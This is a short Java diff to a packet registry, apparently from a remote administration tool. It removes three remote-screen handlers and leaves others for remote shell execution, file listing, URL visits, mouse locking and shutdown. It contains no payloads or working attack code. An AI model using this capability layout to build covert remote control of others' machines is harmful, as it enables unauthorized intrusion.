@@ -11,7 +11,6 @@ public class IncomingPackets {
         PACKETS_INCOMING.put((short) 0, Packet0Ping.class);
         PACKETS_INCOMING.put((short) 10, Packet10Messagebox.class);
         PACKETS_INCOMING.put((short) 11, Packet11Disconnect.class);
-        PACKETS_INCOMING.put((short) 12, Packet12RemoteScreen.class);
         // 13
         PACKETS_INCOMING.put((short) 14, Packet14VisitURL.class);
         PACKETS_INCOMING.put((short) 15, Packet15ListFiles.class);
@@ -25,7 +24,6 @@ public class IncomingPackets {
         PACKETS_INCOMING.put((short) 23, Packet23RemoteShellStart.class);
         PACKETS_INCOMING.put((short) 24, Packet24RemoteShellStop.class);
         PACKETS_INCOMING.put((short) 25, Packet25RemoteShellExecute.class);
-        PACKETS_INCOMING.put((short) 26, Packet26StopRemoteScreen.class);
         PACKETS_INCOMING.put((short) 27, Packet27ToggleMouseLock.class);
         PACKETS_INCOMING.put((short) 28, Packet28ShutdownComputer.class);
         PACKETS_INCOMING.put((short) 29, Packet29RestartComputer.class);
@@ -49,7 +47,6 @@ public class IncomingPackets {
         PACKETS_INCOMING.put((short) 47, Packet47RenameFile.class);
         PACKETS_INCOMING.put((short) 48, Packet48ChatStart.class);
         PACKETS_INCOMING.put((short) 49, Packet49ChatEnd.class);
-        PACKETS_INCOMING.put((short) 50, Packet50UpdateRemoteScreen.class);
         PACKETS_INCOMING.put((short) 51, Packet51ChatMessage.class);
         // 52
         PACKETS_INCOMING.put((short) 53, Packet53StartSearch.class);
